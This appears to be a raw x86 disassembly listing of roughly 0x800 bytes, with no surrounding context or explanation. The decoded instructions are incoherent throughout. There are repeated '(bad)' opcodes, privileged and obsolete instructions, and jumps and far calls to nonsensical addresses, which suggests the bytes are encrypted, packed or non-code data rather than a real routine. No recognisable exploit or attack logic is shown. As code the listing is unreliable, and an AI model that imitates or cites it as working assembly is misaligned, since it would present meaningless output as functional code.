  41469a:	mov    dl,0x14
  41469c:	repz cmp BYTE PTR [ebp-0x68],dl
  4146a0:	inc    edi
  4146a1:	outs   dx,DWORD PTR ds:[esi]
  4146a2:	call   ebx
  4146a4:	sub    DWORD PTR [ecx+0x6430dee],edx
  4146aa:	aad    0x93
  4146ac:	push   eax
  4146ad:	mov    ecx,0xf91b794e
  4146b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146b3:	add    BYTE PTR es:[esi-0x333873fd],dh
  4146ba:	in     al,dx
  4146bb:	dec    esp
  4146bc:	pop    es
  4146bd:	test   DWORD PTR [eax+edi*4+0xc],edi
  4146c1:	inc    esi
  4146c2:	in     al,dx
  4146c3:	aaa    
  4146c4:	jne    0x414675
  4146c6:	push   ss
  4146c7:	stos   DWORD PTR es:[edi],eax
  4146c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c9:	(bad)  
  4146cb:	sbb    BYTE PTR [ebx+0x374b3f35],dh
  4146d1:	mov    bl,0x25
  4146d3:	imul   esi,DWORD PTR [edi+esi*8+0x6e1d8c21],0x54
  4146db:	jnp    0x414739
  4146dd:	ja     0x414689
  4146df:	test   al,0x97
  4146e1:	imul   eax,DWORD PTR [esp+ebp*1],0x53
  4146e5:	fidiv  DWORD PTR [esi]
  4146e7:	dec    eax
  4146e8:	cwde   
  4146e9:	mov    edi,0xc44ecd95
  4146ee:	xchg   ebx,eax
  4146ef:	lahf   
  4146f0:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146f2:	mov    ebx,0x11012892
  4146f7:	jg     0x414744
  4146f9:	mov    cl,0x7
  4146fb:	cmp    DWORD PTR [ebp-0x61],0x6e65ee58
  414702:	mov    al,0xf6
  414704:	jp     0x41473a
  414706:	test   al,0xb6
  414708:	cli    
  414709:	mov    ebp,0x29d51ad0
  41470e:	mov    edi,0x5238d7ee
  414713:	(bad)  
  414714:	cdq    
  414715:	pop    ebp
  414716:	sahf   
  414717:	(bad)  
  414718:	xchg   edx,eax
  414719:	jmp    0xb156:0xcc3c08b7
  414720:	pop    ecx
  414721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414722:	jns    0x414713
  414724:	mov    eax,0x5464213d
  414729:	sbb    bh,cl
  41472b:	in     eax,dx
  41472c:	(bad)  
  41472d:	mov    cl,ah
  41472f:	push   eax
  414730:	cli    
  414731:	xchg   ebx,eax
  414732:	inc    esi
  414733:	xchg   BYTE PTR [edi+0x3a],bl
  414736:	jno    0x4146fe
  414738:	jge    0x4146ff
  41473a:	aas    
  41473b:	stc    
  41473c:	push   eax
  41473d:	pop    esp
  41473e:	mov    esp,0xf4ab98b3
  414743:	popf   
  414744:	adc    al,0x91
  414746:	xlat   BYTE PTR ds:[ebx]
  414747:	arpl   WORD PTR ds:0xf773f702,ax
  41474d:	and    al,0xa8
  41474f:	scas   eax,DWORD PTR es:[edi]
  414750:	sbb    cl,BYTE PTR [ebx+0xd]
  414753:	add    BYTE PTR [ebx+0x5db1cada],dh
  414759:	or     eax,DWORD PTR [esi+0x12777a99]
  41475f:	dec    edi
  414760:	ja     0x4147c1
  414762:	(bad)  
  414763:	popf   
  414764:	mul    DWORD PTR [esi]
  414766:	ror    BYTE PTR [ecx],1
  414768:	mov    dl,0xf2
  41476a:	mov    al,ds:0x3ea8ea29
  41476f:	jno    0x414754
  414771:	cdq    
  414772:	retf   0xa57
  414775:	test   DWORD PTR ds:0xbb1f5c17,0x27339048
  41477f:	dec    edx
  414780:	xchg   ebx,eax
  414781:	ror    BYTE PTR [eax-0x2213abad],1
  414787:	sbb    al,0xa5
  414789:	push   ebp
  41478a:	jmp    FWORD PTR [eax+0x25]
  41478d:	cdq    
  41478e:	mov    al,0x1a
  414790:	jns    0x414767
  414792:	call   0xc395faa8
  414797:	pop    esi
  414798:	test   DWORD PTR [esi],eax
  41479a:	mov    dl,0x4f
  41479c:	mov    dh,0xe0
  41479e:	les    edx,FWORD PTR [edx]
  4147a0:	aam    0x75
  4147a2:	test   al,0xa0
  4147a4:	ficomp WORD PTR [eax-0x71]
  4147a7:	push   edx
  4147a8:	hlt    
  4147a9:	addr16 adc eax,0x2572818c
  4147af:	gs xor eax,0x52021691
  4147b5:	pop    edi
  4147b6:	adc    edi,DWORD PTR [ebx-0x6d0cd55d]
  4147bc:	stos   BYTE PTR es:[edi],al
  4147bd:	mov    BYTE PTR [ebx+0x47c72a83],dl
  4147c3:	mov    ?,WORD PTR [edx-0x7]
  4147c6:	xor    esi,ecx
  4147c8:	xchg   edi,eax
  4147c9:	pop    edi
  4147ca:	push   ss
  4147cb:	mov    ds:0xfccebf97,al
  4147d0:	int3   
  4147d1:	mov    bh,0x6e
  4147d3:	sbb    al,0x69
  4147d5:	xchg   ebx,eax
  4147d6:	sbb    ebx,ebp
  4147d8:	pop    edi
  4147d9:	or     ah,BYTE PTR [ebp-0x49]
  4147dc:	mov    esi,0x82a40d3e
  4147e1:	cmp    al,0x6d
  4147e3:	sub    BYTE PTR [edi-0x1],0x6b
  4147e7:	sub    BYTE PTR [eax+0x3616d978],0x38
  4147ee:	addr16 push ebp
  4147f0:	push   cs
  4147f1:	mov    ch,dh
  4147f3:	lock fisttp DWORD PTR [ebx-0x4a]
  4147f7:	push   ss
  4147f8:	loop   0x41481c
  4147fa:	ret    
  4147fb:	cmp    al,BYTE PTR [esi]
  4147fd:	jmp    DWORD PTR [esi+0x78d2b960]
  414803:	or     ah,BYTE PTR [ebx]
  414805:	cmp    eax,0xd08fb4c6
  41480a:	pop    ds
  41480b:	jmp    0x41488a
  41480d:	or     ebp,DWORD PTR [eax+0x1f]
  414810:	mov    ?,WORD PTR [esi]
  414812:	fldpi  
  414814:	in     al,dx
  414815:	mov    esp,0x4bfc9490
  41481a:	ror    BYTE PTR [eax-0x78d4a9ad],cl
  414820:	int3   
  414821:	mov    ebx,DWORD PTR [eax-0x7d6ea5ab]
  414827:	fdivr  QWORD PTR [ecx]
  414829:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41482a:	outs   dx,DWORD PTR ds:[esi]
  41482b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41482c:	dec    ecx
  41482d:	mov    esp,0xd1ba5bee
  414832:	mov    ds:0xa2ff7dbf,al
  414837:	mov    dh,0x70
  414839:	gs mov ebp,0x6a853a30
  41483f:	add    BYTE PTR [edi+0x45ef482e],ch
  414845:	shr    ecx,0x2c
  414848:	adc    bh,ch
  41484a:	cmc    
  41484b:	lds    edi,FWORD PTR [esi]
  41484d:	sahf   
  41484e:	and    al,0xe2
  414850:	shl    DWORD PTR [ecx+0x68],cl
  414853:	icebp  
  414854:	xchg   BYTE PTR [esi+0x34],bl
  414857:	jo     0x41482d
  414859:	xchg   ebx,eax
  41485a:	push   edx
  41485b:	or     DWORD PTR [ecx+0x3d],eax
  41485e:	out    0x24,eax
  414860:	and    eax,0x8d5e8d7c
  414865:	xor    al,0x66
  414867:	imul   esp,DWORD PTR [ebx],0x51
  41486a:	(bad)  
  41486b:	dec    ebp
  41486c:	(bad)  [edi+0x21]
  41486f:	test   al,0xaa
  414871:	xor    BYTE PTR [ecx+0x1],bl
  414874:	push   ebx
  414875:	sbb    DWORD PTR [eax+0x7e],ebx
  414878:	test   BYTE PTR [esi-0x556e83f],ah
  41487e:	cli    
  41487f:	dec    ecx
  414880:	mov    ch,0x86
  414882:	test   dl,al
  414884:	jmp    0x69fb5d87
  414889:	loopne 0x414826
  41488b:	(bad)  
  41488c:	cmc    
  41488d:	jae    0x4148e8
  41488f:	and    bl,dh
  414891:	dec    edx
  414892:	cmc    
  414893:	dec    ebp
  414894:	xchg   ebp,eax
  414895:	(bad)  
  414896:	adc    BYTE PTR [edi-0x18],dh
  414899:	cdq    
  41489a:	int3   
  41489b:	dec    ebx
  41489c:	jecxz  0x414904
  41489e:	push   es
  41489f:	repnz in eax,dx
  4148a1:	loop   0x414828
  4148a3:	popa   
  4148a4:	mov    ch,0x89
  4148a6:	ds mov ebx,0xcc04b514
  4148ac:	rcr    dl,1
  4148ae:	retf   
  4148af:	mov    edx,0xc5c52a5d
  4148b4:	push   cs
  4148b5:	lahf   
  4148b6:	or     al,ch
  4148b8:	sbb    al,0xf9
  4148ba:	rol    DWORD PTR [esi+0x7a],1
  4148bd:	pusha  
  4148be:	lock (bad) 
  4148c0:	repnz mov bl,0x71
  4148c3:	jo     0x4148be
  4148c5:	hlt    
  4148c6:	mov    ah,bh
  4148c8:	sbb    dh,bh
  4148ca:	bound  esi,QWORD PTR [ebx+0x2f5fe349]
  4148d0:	stos   DWORD PTR es:[edi],eax
  4148d1:	cmp    eax,0x480dabbb
  4148d6:	mov    edx,0xffea585a
  4148db:	in     eax,dx
  4148dc:	ret    
  4148dd:	pop    es
  4148de:	cmp    bl,dl
  4148e0:	push   es
  4148e1:	ret    
  4148e2:	sar    BYTE PTR [bx+di-0x6f],0x5b
  4148e7:	inc    edi
  4148e8:	pop    ebx
  4148e9:	int3   
  4148ea:	mov    ds:0x9690a931,eax
  4148ef:	inc    edi
  4148f0:	push   ds
  4148f1:	lea    ebp,[ecx+0x530add96]
  4148f7:	call   0x485d:0x2be19279
  4148fe:	aad    0x92
  414900:	out    dx,al
  414901:	test   BYTE PTR [esi-0xc24816d],dl
  414907:	xchg   BYTE PTR [esp+ebp*4+0x66],dh
  41490b:	imul   esi,DWORD PTR [esi+0x576cc415],0x12
  414912:	mov    BYTE PTR [edi-0x9f310de],ch
  414918:	xchg   bp,ax
  41491a:	sub    cl,ch
  41491c:	cmp    edx,DWORD PTR [edi-0x45]
  41491f:	sbb    al,0x65
  414921:	and    al,0x90
  414923:	jb     0x414918
  414925:	pop    edi
  414926:	cmp    esi,0xfffffff1
  414929:	fnsetpm(287 only) 
  41492b:	aad    0xff
  41492d:	sar    DWORD PTR [edx],cl
  41492f:	and    al,0xdd
  414931:	out    dx,eax
  414932:	jmp    0x3b9f1e73
  414937:	sbb    al,0xa7
  414939:	imul   ecx,DWORD PTR ds:[eax-0x5996e78f],0x83d033cd
  414944:	mov    bh,0xcc
  414946:	aaa    
  414947:	inc    esp
  414948:	xor    BYTE PTR [edi+0x74],bh
  41494b:	shr    bl,cl
  41494d:	fst    QWORD PTR [esp+edi*1-0x2a]
  414951:	lahf   
  414952:	sub    BYTE PTR [eax+ebp*1+0x431dec],ah
  414959:	or     al,0x7b
  41495b:	out    dx,eax
  41495c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41495e:	retf   0xc8bb
  414961:	jae    0x41496c
  414963:	fisub  WORD PTR [ecx-0x35]
  414966:	(bad)  
  414967:	pop    eax
  414968:	mov    bl,0xb5
  41496a:	pop    ebx
  41496b:	sbb    ecx,DWORD PTR [ecx-0x339152cd]
  414971:	xor    BYTE PTR [eax+0x3],ch
  414974:	bound  ax,DWORD PTR [ebx+0x398cee69]
  41497b:	sbb    ebx,ecx
  41497d:	inc    edi
  41497e:	(bad)  
  41497f:	repnz (bad) 
  414981:	retf   
  414982:	sahf   
  414983:	cmp    DWORD PTR [edi-0x3dfb92b7],ecx
  414989:	cwde   
  41498a:	fdiv   st(4),st
  41498c:	sbb    ecx,DWORD PTR [ebp+0x717d3305]
  414992:	ret    0x75a2
  414995:	mov    edi,0xc7a9d107
  41499a:	dec    ecx
  41499b:	jbe    0x414955
  41499d:	pop    ebx
  41499e:	ja     0x41494e
  4149a0:	outs   dx,DWORD PTR ds:[esi]
  4149a1:	(bad)  
  4149a2:	and    eax,DWORD PTR [ecx]
  4149a4:	rcr    DWORD PTR [edx+0x3b],0xab
  4149a8:	mov    bh,0xeb
  4149aa:	mov    bh,0xa
  4149ac:	dec    ecx
  4149ad:	sbb    DWORD PTR [ebp-0x11],esp
  4149b0:	jge    0x41497c
  4149b2:	nop
  4149b3:	sbb    cl,BYTE PTR [esi+eax*8-0x73]
  4149b7:	loope  0x41499f
  4149b9:	mov    eax,ds:0x66fe13cb
  4149be:	lock pop edi
  4149c0:	mov    dh,0x92
  4149c2:	loope  0x41497a
  4149c4:	pop    esi
  4149c5:	or     BYTE PTR [edx],ah
  4149c7:	adc    eax,0x6aba9d1a
  4149cc:	sub    al,dl
  4149ce:	call   0x27e69ff
  4149d3:	sub    ebp,DWORD PTR [esi]
  4149d5:	pop    ebx
  4149d6:	xor    bl,BYTE PTR [edx+0x5a]
  4149d9:	fs stos DWORD PTR es:[edi],eax
  4149db:	pop    eax
  4149dc:	outs   dx,BYTE PTR ds:[esi]
  4149dd:	dec    eax
  4149de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149df:	ror    edi,0xa6
  4149e2:	js     0x414a31
  4149e4:	jb     0x414974
  4149e6:	inc    ebp
  4149e7:	inc    ebp
  4149e8:	mov    dh,BYTE PTR [eax-0x4cbb7336]
  4149ee:	retf   0xf849
  4149f1:	scas   al,BYTE PTR es:[edi]
  4149f2:	mov    dl,0x5e
  4149f4:	sbb    bh,BYTE PTR [edi]
  4149f6:	js     0x4149ed
  4149f8:	fwait
  4149f9:	adc    eax,0x6878291e
  4149fe:	cmp    al,0xf
  414a00:	test   al,0xc9
  414a02:	jo     0x414a43
  414a04:	ret    
  414a05:	jle    0x414a09
  414a07:	xor    edi,DWORD PTR [edx+0x4c]
  414a0a:	mov    ds:0x4642eb82,al
  414a0f:	push   eax
  414a10:	out    dx,al
  414a11:	ja     0x414a01
  414a13:	sahf   
  414a14:	cmp    al,0x23
  414a16:	jp     0x414a44
  414a18:	inc    esp
  414a19:	repnz mov dh,0x68
  414a1c:	mov    eax,ds:0x6680c042
  414a21:	cmc    
  414a22:	dec    esp
  414a23:	mov    bl,0x6e
  414a25:	test   BYTE PTR ds:0x2e2f70b9,bh
  414a2b:	pop    ecx
  414a2c:	or     eax,0x5de24db5
  414a31:	test   eax,edi
  414a33:	int3   
  414a34:	sub    al,0xb9
  414a36:	shl    BYTE PTR [edi+0x47],1
  414a39:	std    
  414a3a:	fnsave [edi+0x28]
  414a3d:	mov    ecx,0x40ae09fb
  414a42:	inc    edx
  414a43:	cmp    BYTE PTR fs:[ebx+0x7f9d06ed],0xe1
  414a4b:	int    0x9e
  414a4d:	xlat   BYTE PTR ds:[ebx]
  414a4e:	adc    ecx,DWORD PTR ds:0xe473b39c
  414a54:	aas    
  414a55:	mov    dh,0xed
  414a57:	cmp    DWORD PTR [esp+eax*8],eax
  414a5a:	repz repz lea eax,[edi]
  414a5e:	adc    al,0x95
  414a60:	adc    ebp,DWORD PTR [ecx-0x48f1d0]
  414a66:	call   FWORD PTR [eax]
  414a68:	dec    ecx
  414a69:	cmp    DWORD PTR ds:[ecx-0x3a],eax
  414a6d:	repnz and BYTE PTR ds:0x4d8a5f58,bh
  414a74:	mov    eax,0xf235ab33
  414a79:	cmp    ebx,esp
  414a7b:	pop    ss
  414a7c:	cli    
  414a7d:	xor    ebp,DWORD PTR [edx-0x3fe4c5ec]
  414a83:	popa   
  414a84:	cld    
  414a85:	xchg   esp,eax
  414a86:	or     eax,0x6125178d
  414a8b:	fsubr  DWORD PTR [edx]
  414a8d:	fs (bad) 
  414a8f:	mov    edx,0x1f27d44e
  414a94:	and    al,bl
  414a96:	pop    esp
  414a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a98:	fdiv   DWORD PTR [ecx]
  414a9a:	icebp  
  414a9b:	sub    al,0x4e
  414a9d:	xchg   BYTE PTR [esi],ah
  414a9f:	push   ss
  414aa0:	or     ch,BYTE PTR [ebx-0x7c46d7cd]
  414aa6:	add    dl,BYTE PTR [ebx-0x3c895632]
  414aac:	cmp    BYTE PTR [edi],0x86
  414aaf:	or     BYTE PTR [ecx+eax*1-0x74],ah
  414ab3:	(bad)  
  414ab4:	push   ds
  414ab5:	jbe    0x414b2c
  414ab7:	pop    ss
  414ab8:	cdq    
  414ab9:	push   0x2d
  414abb:	outs   dx,DWORD PTR ds:[esi]
  414abc:	push   esp
  414abd:	and    dh,bh
  414abf:	mov    esi,0x35c3f2a9
  414ac4:	and    edx,ecx
  414ac6:	jne    0x414adc
  414ac8:	xor    al,0xd2
  414aca:	int    0xa0
  414acc:	cmp    DWORD PTR [edi-0x2e],0x65
  414ad0:	mov    ebp,0xe8e45440
  414ad5:	mov    bl,BYTE PTR [ebx-0x1d]
  414ad8:	and    al,0x62
  414ada:	push   edx
  414adb:	pop    ebp
  414adc:	xchg   edx,eax
  414add:	shr    esp,1
  414adf:	cli    
  414ae0:	jl     0x414a96
  414ae2:	xor    al,0x7a
  414ae4:	into   
  414ae5:	adc    DWORD PTR [edx],0xfb6aa11b
  414aeb:	out    0x83,eax
  414aed:	cmp    bl,BYTE PTR [esi+0x58]
  414af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414af1:	cli    
  414af2:	mov    ch,0xbc
  414af4:	inc    ecx
  414af5:	imul   edi,DWORD PTR [edx+eiz*2-0x2e],0x2be4636b
  414afd:	cld    
  414afe:	adc    DWORD PTR [esi*2-0x3ba42c56],edi
  414b05:	sahf   
  414b06:	retf   
  414b07:	lods   eax,DWORD PTR ds:[esi]
  414b08:	push   ecx
  414b09:	lods   al,BYTE PTR ds:[esi]
  414b0a:	push   cs
  414b0b:	sub    al,ch
  414b0d:	pushf  
  414b0e:	in     al,dx
  414b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b10:	ins    DWORD PTR es:[edi],dx
  414b11:	add    al,0x6
  414b13:	sub    BYTE PTR [eax+0x5182fd0a],ah
  414b19:	cmp    al,0xe8
  414b1b:	jp     0x414af3
  414b1d:	jae    0x414ad8
  414b1f:	add    ebp,DWORD PTR [edi+0x39]
  414b22:	in     eax,dx
  414b23:	(bad)  
  414b24:	pop    eax
  414b25:	pop    ecx
  414b26:	aas    
  414b27:	lds    eax,FWORD PTR [ebp-0x344a566d]
  414b2d:	sahf   
  414b2e:	stc    
  414b2f:	sbb    DWORD PTR [esi],esi
  414b31:	stc    
  414b32:	mov    bl,0x53
  414b34:	int    0x76
  414b36:	pop    ds
  414b37:	and    DWORD PTR [edx-0x2f2857eb],0xffffffd4
  414b3e:	mov    ch,0x33
  414b40:	test   al,0xec
  414b42:	sbb    ebx,DWORD PTR [edx-0x2ae7c0f2]
  414b48:	les    eax,FWORD PTR [ebp+0x55]
  414b4b:	push   ss
  414b4c:	jb     0x414b58
  414b4e:	xchg   ebx,eax
  414b4f:	inc    ebp
  414b50:	clc    
  414b51:	ss scas al,BYTE PTR es:[edi]
  414b53:	ss mov al,0xec
  414b56:	hlt    
  414b57:	jle    0x414b0f
  414b59:	push   0x30
  414b5b:	popf   
  414b5c:	xchg   BYTE PTR [esi],bh
  414b5e:	add    eax,0x10f2c4b2
  414b63:	add    DWORD PTR [eax-0x64],0x47
  414b67:	adc    DWORD PTR [eax-0x6a],ecx
  414b6a:	xchg   ecx,eax
  414b6b:	pop    edx
  414b6c:	icebp  
  414b6d:	std    
  414b6e:	arpl   WORD PTR [edx],si
  414b70:	dec    cl
  414b72:	pop    ebx
  414b73:	dec    eax
  414b74:	adc    al,cl
  414b76:	jecxz  0x414b89
  414b78:	cmp    al,0x25
  414b7a:	ins    DWORD PTR es:[edi],dx
  414b7b:	jne    0x414bf3
  414b7d:	cdq    
  414b7e:	push   esi
  414b7f:	rcr    DWORD PTR [eax],cl
  414b81:	jnp    0x414bb3
  414b83:	inc    esp
  414b84:	neg    DWORD PTR [eax-0x71dd2917]
  414b8a:	js     0x414b28
  414b8c:	je     0x414b9f
  414b8e:	fcmovb st,st(3)
  414b90:	cmp    al,BYTE PTR [ecx]
  414b92:	pop    edi
  414b93:	mov    edi,fs
  414b95:	jb     0x414c10
  414b97:	lahf   
  414b98:	cli    
  414b99:	pop    eax
  414b9a:	cmp    edx,DWORD PTR [esi]
  414b9c:	pusha  
  414b9d:	(bad)  
  414b9e:	mov    bh,0xd3
  414ba0:	nop
  414ba1:	mov    edx,0x5102b154
  414ba6:	push   ds
  414ba7:	adc    BYTE PTR [ecx-0x2989baf0],0x2e
  414bae:	stos   BYTE PTR es:[edi],al
  414baf:	mov    bh,0xab
  414bb1:	pop    edi
  414bb2:	mov    ebp,0xc6c50d1f
  414bb7:	js     0x414b9b
  414bb9:	dec    edx
  414bba:	cmp    eax,0x44dda879
  414bc0:	xchg   BYTE PTR [esi-0x55c435da],bl
  414bc6:	or     DWORD PTR [ebx-0x31b4b339],ecx
  414bcc:	rcl    DWORD PTR [eax-0x44],1
  414bcf:	inc    ecx
  414bd0:	or     ebx,DWORD PTR [ebx+0xb]
  414bd3:	mov    bh,0xdc
  414bd5:	mov    edi,0x471335fb
  414bda:	cmp    ebp,DWORD PTR [eax+0x7054b0a8]
  414be0:	mov    ch,0x73
  414be2:	arpl   WORD PTR [edx+0x734e808c],dx
  414be8:	pushf  
  414be9:	push   edx
  414bea:	mov    esp,0xe568d598
  414bef:	xor    dl,bh
  414bf1:	vpminub xmm6,xmm1,XMMWORD PTR [edx]
  414bf5:	mov    WORD PTR [ebx],fs
  414bf7:	bound  ecx,QWORD PTR [edi]
  414bf9:	push   esi
  414bfa:	or     BYTE PTR [edx-0x356d2771],dh
  414c00:	enter  0xd637,0x4f
  414c04:	mov    eax,ds:0x4630995f
  414c09:	loope  0x414b9b
  414c0b:	jno    0x414c82
  414c0d:	cmp    esp,esp
  414c0f:	inc    ebp
  414c10:	loopne 0x414ba0
  414c12:	pop    ebx
  414c13:	xchg   edx,eax
  414c14:	cmc    
  414c15:	push   edx
  414c16:	dec    edx
  414c17:	fwait
  414c18:	inc    eax
  414c19:	shr    DWORD PTR [edi+0x7a],0x5e
  414c1d:	cmp    al,0xbd
  414c1f:	(bad)  
  414c20:	jo     0x414c3e
  414c22:	push   esp
  414c23:	adc    ebp,DWORD PTR [ecx+ecx*4]
  414c26:	aas    
  414c27:	(bad)  
  414c28:	(bad)  
  414c29:	pop    edi
  414c2a:	mov    al,BYTE PTR [edx+0x36]
  414c2d:	jnp    0x414c73
  414c2f:	push   esi
  414c30:	ror    BYTE PTR [ecx+0x32],1
  414c33:	pop    eax
  414c34:	jle    0x414c96
  414c36:	cmp    dh,ch
  414c38:	(bad)  
  414c39:	lods   eax,DWORD PTR ds:[esi]
  414c3a:	mov    cl,0xcd
  414c3c:	in     al,dx
  414c3d:	loope  0x414bd2
  414c3f:	mov    al,ds:0x2670013c
  414c44:	and    eax,0x2ada3e4c
  414c49:	sbb    ch,al
  414c4b:	imul   esp,DWORD PTR [ebx+0x672bedf7],0x19
  414c52:	rcr    BYTE PTR [eax-0x17],1
  414c55:	xchg   ebp,eax
  414c56:	push   esp
  414c57:	xor    eax,ebx
  414c59:	mov    al,0xaf
  414c5b:	cmp    eax,0xebc5d665
  414c60:	(bad)  
  414c61:	sbb    BYTE PTR [edi-0x130d8e91],dh
  414c67:	repz cmp edx,DWORD PTR [edi+eiz*8-0x422e0ce4]
  414c6f:	(bad)  
  414c71:	push   ebp
  414c72:	sub    al,0x4e
  414c74:	retf   0x5587
  414c77:	mov    eax,ds:0x84519d08
  414c7c:	es loopne 0x414c4c
  414c7f:	adc    bh,BYTE PTR [ebp+0x6a0c8d24]
  414c85:	jp     0x414c9f
  414c87:	loopne 0x414c95
  414c89:	jl     0x414c89
  414c8b:	xchg   ebp,eax
  414c8c:	or     BYTE PTR [edx-0x68ea3086],bl
  414c92:	and    ah,al
  414c94:	nop
  414c95:	adc    eax,0xebdf1f72
  414c9a:	xor    BYTE PTR [edi+0x290cb910],al
  414ca0:	(bad)  
  414ca1:	fcom   DWORD PTR [edx-0x70]
  414ca4:	push   edx
  414ca5:	in     al,0x96
  414ca7:	fs lock cmp al,0x5c
  414cab:	and    ebx,ecx
  414cad:	sbb    DWORD PTR [ebp+0x20],esp
  414cb0:	sub    al,0xc5
  414cb2:	push   ds
  414cb3:	sbb    ch,BYTE PTR ds:0x572c161d
  414cb9:	lahf   
  414cba:	mov    dh,0x45
  414cbc:	data16 jp 0x414c81
  414cbf:	adc    al,bh
  414cc1:	popf   
  414cc2:	stos   BYTE PTR es:[edi],al
  414cc3:	daa    
  414cc4:	inc    edx
  414cc5:	sbb    al,dh
  414cc7:	mov    al,0x9
  414cc9:	lds    esp,FWORD PTR [eax]
  414ccb:	cli    
  414ccc:	and    dh,BYTE PTR [esi]
  414cce:	test   BYTE PTR [ebp-0x539bc54b],dh
  414cd4:	inc    edx
  414cd5:	out    dx,eax
  414cd6:	popa   
  414cd7:	jle    0x414cb5
  414cd9:	ret    
  414cda:	cwde   
  414cdb:	pop    ecx
  414cdc:	pop    eax
  414cdd:	aad    0xee
  414cdf:	rcr    DWORD PTR [ecx+0x5b],1
  414ce2:	(bad)  
  414ce3:	mov    fs,ecx
  414ce5:	mov    al,ds:0x93dfab2e
  414cea:	cmp    al,0xd
  414cec:	out    0x87,al
  414cee:	push   0xffffff91
  414cf0:	sub    DWORD PTR [eax+0x1c],esp
  414cf3:	jecxz  0x414cec
  414cf5:	loope  0x414c7b
  414cf7:	adc    al,0x5a
  414cf9:	add    bh,dh
  414cfb:	mov    esp,0xfb3cfa8d
  414d00:	mov    bl,0x71
  414d02:	(bad)  
  414d03:	jl     0x414cf7
  414d05:	sbb    eax,0x8eaf62e9
  414d0a:	xchg   ebx,eax
  414d0b:	imul   edi,DWORD PTR [ebp+0x7dc5b1ed],0x7a89b7ad
  414d15:	adc    ecx,DWORD PTR [edi+0x4b]
  414d18:	ror    ecx,cl
  414d1a:	push   esp
  414d1b:	fldenv [ebx+eiz*2+0x2fee140d]
  414d22:	inc    ecx
  414d23:	stc    
  414d24:	fwait
  414d25:	dec    esp
  414d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d27:	daa    
  414d28:	jge    0x414cf9
  414d2a:	lahf   
  414d2b:	pop    es
  414d2c:	icebp  
  414d2d:	dec    eax
  414d2e:	fdivr  DWORD PTR [edx]
  414d30:	mov    DWORD PTR [esi-0x4d],esp
  414d33:	pop    es
  414d34:	inc    edx
  414d35:	dec    eax
  414d36:	mov    dl,0x41
  414d38:	or     bh,BYTE PTR [eax-0x16]
  414d3b:	fcmovb st,st(1)
  414d3d:	jbe    0x414d2a
  414d3f:	mov    al,0x2d
  414d41:	aad    0xe6
  414d43:	and    dh,BYTE PTR [ebx+ebp*8+0x2e4c85fe]
  414d4a:	inc    DWORD PTR [ebx+0x76d62f34]
  414d50:	jo     0x414da7
  414d52:	mov    edx,0x33545d3d
  414d57:	clc    
  414d58:	mov    bl,0x13
  414d5a:	push   0xffffff8a
  414d5c:	call   0x8e96:0x35eabebf
  414d63:	scas   al,BYTE PTR es:[edi]
  414d64:	add    DWORD PTR [ebx],esp
  414d66:	(bad)  
  414d67:	jne    0x414d82
  414d69:	and    BYTE PTR cs:[esi*1-0x756c58a8],0x17
  414d72:	and    dl,dh
  414d74:	xor    ah,cl
  414d76:	es mov bl,0x8f
  414d79:	jmp    0xbd916ab6
  414d7e:	std    
  414d7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d80:	mov    ebx,0x91e00d8d
  414d85:	pop    ds
  414d86:	pop    ebp
  414d87:	mov    ah,0x30
  414d89:	cmp    ebp,DWORD PTR [ebx+0x37ef70d4]
  414d8f:	push   esi
  414d90:	mov    bl,0x65
  414d92:	jmp    0x414d6a
  414d94:	dec    esp
  414d95:	and    edx,DWORD PTR [edi]
  414d97:	ins    DWORD PTR es:[edi],dx
  414d98:	loop   0x414e07
  414d9a:	adc    edi,0x77ece133
  414da0:	stc    
  414da1:	cmp    al,0x3c
  414da3:	dec    esp
  414da4:	mov    dh,0x70
  414da6:	arpl   WORD PTR [ebp+0x3b3ca4fe],sp
  414dac:	imul   sp,WORD PTR [ecx-0x71],0xf526
  414db2:	pop    ebx
  414db3:	outs   dx,DWORD PTR ds:[esi]
  414db4:	int3   
  414db5:	pop    eax
  414db6:	mov    esp,0xaf1ac4ff
  414dbb:	cmc    
  414dbc:	push   ebp
  414dbd:	xor    cl,ch
  414dbf:	into   
  414dc0:	loopne 0x414df5
  414dc2:	dec    ebx
  414dc3:	and    BYTE PTR [edi],cl
  414dc5:	push   0x8f2fd04c
  414dca:	or     BYTE PTR [esi+0x3d750017],cl
  414dd0:	leave  
  414dd1:	mov    dl,0x1b
  414dd3:	cmp    edi,DWORD PTR [edx+0x71e5c352]
  414dd9:	(bad)  
  414dda:	out    0x28,al
  414ddc:	cs ds stos DWORD PTR es:[edi],eax
  414ddf:	push   0x1ee2f49f
  414de4:	cld    
  414de5:	add    DWORD PTR [ecx],ecx
  414de7:	out    0x32,al
  414de9:	push   cs
  414dea:	xor    BYTE PTR [eax],0x35
  414ded:	pop    esp
  414dee:	cdq    
  414def:	jg     0x414e62
  414df1:	xchg   DWORD PTR [edx],eax
  414df3:	ss clc 
  414df5:	data16 adc bh,cl
  414df8:	shr    BYTE PTR [eax],1
  414dfa:	fild   QWORD PTR [ecx-0x78]
  414dfd:	jae    0x414db0
  414dff:	dec    edi
  414e00:	or     DWORD PTR [edx+0x2d853f96],esp
  414e06:	in     eax,dx
  414e07:	fidiv  WORD PTR ds:0x90238f4c
  414e0d:	inc    ebp
  414e0e:	sbb    al,0xcd
  414e10:	fimul  WORD PTR [esi]
  414e12:	cmc    
  414e13:	xor    ecx,DWORD PTR [esi+0x53]
  414e16:	jo     0x414e41
  414e18:	sar    DWORD PTR [eax],cl
  414e1a:	jb     0x414e4d
  414e1c:	std    
  414e1d:	jne    0x414e70
  414e1f:	pusha  
  414e20:	rcl    DWORD PTR [esp+ebp*2-0xc],1
  414e24:	xchg   ecx,eax
  414e25:	jmp    0xa462eb11
  414e2a:	add    DWORD PTR [eax+0xd],0x71
  414e2e:	cs das 
